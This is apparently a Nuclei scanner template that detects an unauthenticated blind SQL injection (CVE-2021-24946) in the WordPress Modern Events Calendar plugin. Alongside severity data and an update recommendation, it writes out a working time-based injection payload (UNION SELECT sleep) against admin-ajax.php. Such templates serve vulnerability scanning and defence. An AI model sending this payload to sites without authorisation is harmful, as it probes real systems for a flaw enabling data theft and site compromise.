id: CVE-2021-24946
info:
  name: WordPress Modern Events Calendar <6.1.5 - Blind SQL Injection
  author: theamanrawat
  severity: critical
  description: WordPress Modern Events Calendar plugin before version 6.1.5 is vulnerable
    to blind SQL injection, allowing attackers to gain access to sensitive information,
    modify data and execute unauthorized actions on the site.
  reference:
  - https://wpscan.com/vulnerability/09871847-1d6a-4dfe-8a8c-f2f53ff87445
  - https://wordpress.org/plugins/modern-events-calendar-lite/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24946
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24946
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The vulnerability CVE-2021-24946 in the WordPress Modern Events Calendar
      plugin before 6.1.5 allows for possible unauthorized access, manipulation of
      data, and execution of unauthorized administrative actions by exploiting a blind
      SQL injection attack vector.
    recommendation: We recommend updating the WordPress Modern Events Calendar plugin
      to version 6.1.5 or higher to mitigate the risk of blind SQL injection.
  tags: wordpress,wp-plugin,wp,unauth,wpscan,cve,cve2021,sqli,modern-events-calendar-lite
requests:
- raw:
  - '@timeout: 10s

    GET /wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200 || status_code == 500
    - contains(content_type, "text/html")
    - contains(body, "The event is finished") || contains(body, "been a critical error")
    condition: and
